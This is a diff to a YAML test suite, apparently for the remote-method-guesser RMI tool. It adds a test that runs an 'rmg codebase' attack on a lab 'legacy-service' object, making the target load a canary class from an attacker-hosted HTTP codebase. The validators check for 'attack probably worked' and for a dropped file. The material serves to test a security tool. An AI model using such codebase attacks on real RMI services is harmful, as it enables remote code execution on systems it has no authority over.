@@ -22,6 +22,7 @@ plugins:
         - '../../utils/${codebase-class}3.java'
         - '../../utils/${codebase-class}4.java'
         - '../../utils/${codebase-class}5.java'
+        - '../../utils/${codebase-class}6.java'
 
   - http_listener:
       port: 8000
@@ -235,3 +236,35 @@ tests:
           values:
             - 'Caught ClassNotFoundException'
             - 'not be loaded'
+
+
+  - title: Method Codebase Call (Legacy, non default SerialVersionUID)
+    description: |-
+      'Performs a codebase attack on the legacy-service remote object
+      and use a non default SerialVersionUID for the call. rmg should
+      autocorrect the SerialVersionUID to the default value 2L.'
+
+    command:
+      - rmg
+      - codebase
+      - ${TARGET}
+      - '${codebase-class}6'
+      - 'http://${DOCKER-GW}:8000/'
+      - --signature
+      - 'String login(java.util.HashMap dummy1)'
+      - --bound-name
+      - legacy-service
+      - ${OPTIONS}
+      - --serial-version-uid
+      - 4444
+
+    validators:
+      - error: False
+      - contains:
+          values:
+            - 'load canary class'
+            - 'attack probably worked'
+      - file_exists:
+          cleanup: True
+          files:
+            - '${volume}/${codebase-class}6.txt'
